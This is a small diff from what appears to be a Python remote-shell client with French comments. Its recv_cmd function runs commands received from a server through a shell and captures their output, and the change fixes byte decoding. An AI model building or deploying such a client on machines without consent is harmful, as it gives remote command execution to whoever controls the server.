@@ -33,7 +33,7 @@ def recv_cmd():
         if data[:2].decode("utf-8") == 'cd':  #check si les deux premier caractères sont égal à "cd"
             os.chdir(data[3:].decode("utf-8"))  #changé de répertoire grâce à os.chdir
         if len(data) > 0:  #être certain qu'il y a bien des données reçue de la part du serveur
-            cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE,
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             # ouvre une tâche + options de sortie, d'entrée, ...
             output_bytes = cmd.stdout.read() + cmd.stderr.read()  #sortie au format byte
